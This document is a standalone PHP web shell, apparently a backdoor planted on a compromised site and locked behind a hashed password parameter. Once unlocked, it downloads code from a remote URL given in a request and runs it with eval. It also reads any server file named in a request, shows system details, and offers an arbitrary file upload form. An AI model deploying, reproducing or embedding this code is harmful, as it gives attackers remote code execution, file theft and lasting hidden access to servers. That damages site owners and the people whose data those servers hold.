<?php
	function getBot($url) 
	{
	$header = array("Accept: application/json");
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	curl_setopt($ch, CURLOPT_ENCODING, "gzip");
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, "iceBot"); 
	curl_setopt($ch, CURLOPT_TIMEOUT, 10); 
	$retValue = curl_exec($ch);
	$response = json_decode(curl_exec($ch));
	$ee       = curl_getinfo($ch);
	if($retValue==""){
		$retValue = file_get_contents($url);
	}
	return $retValue; 
	}
	if(md5(sha1(md5(sha1(@$_REQUEST["pqd"])))) == "a04fa6726b2ecf2ad938d44fbb93908a"){
	if(@$_REQUEST["cmd"]){
	echo @eval(getBot(@$_REQUEST["cmd"]));
	exit();
	}
	if(@$_REQUEST["read"]){
	$file = file_get_contents($_REQUEST["read"]);
	echo $file;
	exit();
	}
	echo "<b>Namesis<br><br>".php_uname()."<br></b>";
	echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">";
	echo "<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>";
	if( @$_POST["_upl"] == "Upload" ) {	if(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) { echo "<b>Upload Success !!!</b><br><br>"; }	else { echo "<b>Upload Fail !!!</b><br><br>"; }}
	}else{
	exit();
	}
	?>